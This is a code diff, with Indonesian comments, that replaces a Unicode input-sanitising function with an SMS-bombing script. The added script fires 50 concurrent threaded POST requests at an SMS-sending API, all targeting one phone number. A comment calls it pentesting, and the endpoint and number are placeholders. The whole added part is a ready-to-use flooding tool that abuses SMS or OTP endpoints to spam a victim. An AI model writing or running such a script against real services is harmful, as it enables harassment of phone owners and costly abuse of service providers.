@@ -1,20 +1,36 @@
-import unicodedata
+import requests
+import threading
 
-def sanitize_input(text):
-    """
-    Remove dangerous Unicode categories and limit text length.
-    """
-    cleaned = []
-    for char in text:
-        cat = unicodedata.category(char)
-        if cat.startswith("C"):  # Other, control characters
-            continue
-        if cat in ("Cf", "Cs"):  # Format, surrogate
-            continue
-        cleaned.append(char)
+# Konfigurasi target (ganti dengan endpoint sah untuk pentesting)
+url = "https://example.com/api/send_sms"
+phone_number = "+6281234567890"
 
-    return ''.join(cleaned[:1000])  # Limit to 1000 chars
+# Payload
+data = {
+    "phone": phone_number
+}
 
-# Contoh uji
-user_input = "some potentially bad 🏳️‍🌈\u200d\u200d\u200d\u200d\u200d\u200d text"
-print("Sanitized:", sanitize_input(user_input))
+# Headers (jika dibutuhkan)
+headers = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0"
+}
+
+def send_sms():
+    try:
+        response = requests.post(url, json=data, headers=headers)
+        print(f"Status: {response.status_code}, Response: {response.text}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Jumlah request yang ingin dikirim (ubah sesuai kebutuhan pengujian)
+jumlah_bom = 50
+
+threads = []
+for _ in range(jumlah_bom):
+    t = threading.Thread(target=send_sms)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
